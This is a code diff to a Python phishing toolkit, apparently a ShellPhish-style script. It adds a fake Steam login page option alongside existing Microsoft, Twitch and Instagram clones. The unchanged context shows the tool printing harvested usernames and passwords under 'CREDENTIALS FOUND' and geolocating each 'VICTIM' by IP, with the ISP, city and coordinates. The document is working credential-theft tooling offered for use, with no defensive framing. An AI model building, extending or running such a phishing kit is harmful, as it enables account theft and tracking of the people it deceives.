@@ -106,7 +106,9 @@ def runPhishing(social, option2):
     elif social == 'Twitch':
         copy_tree("WebPages/twitch/", "Server/www/")
     elif social == 'Microsoft':
-        copy_tree("WebPages/live_web/", "Server/www/")	
+        copy_tree("WebPages/live_web/", "Server/www/")
+    elif social == 'Steam':
+        copy_tree("WebPages/steam/", "Server/www/")
     elif option2 == '1' and social == 'Instagram':
         copy_tree("WebPages/Instagram_web/", "Server/www/")    
     elif option2 == '2' and social == 'Instagram':
@@ -135,10 +137,10 @@ def waitCreds():
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
-            print '======================================================================'.format(RED, END)
+            print '=================================================='.format(RED, END)
             print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
             system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
-            print '======================================================================'.format(RED, END)
+            print '=================================================='.format(RED, END)
             print ' {0}***** HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE POPULAR *****{1}\n {0}{1}'.format(RED, END)
             
         creds.close()
@@ -153,13 +155,13 @@ def waitCreds():
             matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
             latitude = matchObj.group(1)
             longitude = matchObj.group(2)
-            print '======================================================================'.format(RED, END)
+            print '=================================================='.format(RED, END)
             print ' \n{0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
             print ' \n{0}Longitude: %s \nLatitude: %s{1}'.format(GREEN, END) % (longitude, latitude)
             print ' \n{0}ISP: %s \nCountry: %s{1}'.format(GREEN, END) % (ipinfo['org'], ipinfo['country'])
             print ' \n{0}Region: %s \nCity: %s{1}'.format(GREEN, END) % (ipinfo['region'], ipinfo['city'])
             system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
-            print '======================================================================'.format(RED, END)
+            print '=================================================='.format(RED, END)
             
         creds.close()
         
@@ -247,7 +249,11 @@ def runPEnv():
     elif option == '12':
         loadModule('Microsoft')
         option2 = ''
-        runPhishing('Microsoft', option2)	
+        runPhishing('Microsoft', option2)
+    elif option == '13':
+        loadModule('Steam')
+        option2 = ''
+        runPhishing('Steam', option2)
     else:
         exit(0)
 
